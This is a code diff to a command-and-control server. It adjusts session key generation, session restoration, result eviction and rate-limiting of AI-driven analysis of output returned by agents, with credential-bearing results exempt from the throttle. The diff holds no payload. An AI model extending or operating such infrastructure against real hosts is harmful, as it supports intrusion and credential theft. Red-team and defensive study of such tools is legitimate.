@@ -154,10 +154,12 @@ def _sse_send(q: queue.Queue, event: dict) -> bool:
 # ── C2 session registry ──────────────────────────────────────────────────────
 _C2_SESSIONS: dict = {}
 _C2_LOCK = threading.Lock()
+_AUTO_ANALYZE_TS: dict[str, float] = {}
+_AUTO_ANALYZE_INTERVAL = 30.0  # seconds between auto-analysis per session
 
 
 def _c2_new_session(session_id: str, host: str) -> int:
-    key = (secrets.randbits(7) | 1) & 0xFF   # odd, 1-127
+    key = secrets.randbelow(255) + 1  # 1-255, full byte range
     with _C2_LOCK:
         _C2_SESSIONS[session_id] = {
             "host":      host,
@@ -177,11 +179,14 @@ def restore_c2_sessions_from_db(db) -> int:
     count = 0
     for row in db.get_live_sessions():
         sid = row["id"]
+        key = row.get("c2_key", 0)
+        if not key:
+            continue  # skip sessions without stored key — agent will re-register
         with _C2_LOCK:
             if sid not in _C2_SESSIONS:
                 _C2_SESSIONS[sid] = {
                     "host":      row.get("host", "?"),
-                    "key":       row.get("c2_key", 0),
+                    "key":       key,
                     "tasks":     collections.deque(),
                     "results":   {},
                     "last_seen": datetime.now(),
@@ -215,6 +220,10 @@ def _c2_store_result(session_id: str, task_id: str, output: str) -> None:
         if sess:
             sess["results"][task_id] = (datetime.now(), output)
             sess["last_seen"] = datetime.now()
+            # Evict oldest result when over 500 to prevent unbounded growth
+            if len(sess["results"]) > 500:
+                oldest = min(sess["results"], key=lambda k: sess["results"][k][0])
+                del sess["results"][oldest]
 
 
 def _auto_analyze_result(session_id: str, task_id: str, output: str, has_creds: bool) -> None:
@@ -224,6 +233,14 @@ def _auto_analyze_result(session_id: str, task_id: str, output: str, has_creds: 
         return
     if clean == "#< CLIXML" or clean.rstrip() == "#< CLIXML":
         return
+
+    # Rate-limit: max one auto-analysis per session per interval (cred results bypass throttle)
+    if not has_creds:
+        now = time.monotonic()
+        last = _AUTO_ANALYZE_TS.get(session_id, 0.0)
+        if now - last < _AUTO_ANALYZE_INTERVAL:
+            return
+        _AUTO_ANALYZE_TS[session_id] = now
 
     # Skip silently if neither Claude API nor Ollama is configured
     if not os.environ.get("ANTHROPIC_API_KEY", "").strip():
@@ -263,18 +280,18 @@ def _auto_analyze_result(session_id: str, task_id: str, output: str, has_creds: 
     )
 
     def _run():
-        consult_stream(question, context, stream_id, _sse_publish)
+        consult_stream(question, context, stream_id, _sse_publish, session_id=session_id)
 
     threading.Thread(target=_run, daemon=True).start()
 
 
 def _c2_get_result(session_id: str, task_id: str) -> str | None:
-    """Return and consume the result for task_id (one-shot fetch)."""
+    """Return the result for task_id (persistent — not consumed on fetch)."""
     with _C2_LOCK:
         sess = _C2_SESSIONS.get(session_id)
         if not sess:
             return None
-        entry = sess["results"].pop(task_id, None)
+        entry = sess["results"].get(task_id)
         return entry[1] if entry else None
 
 
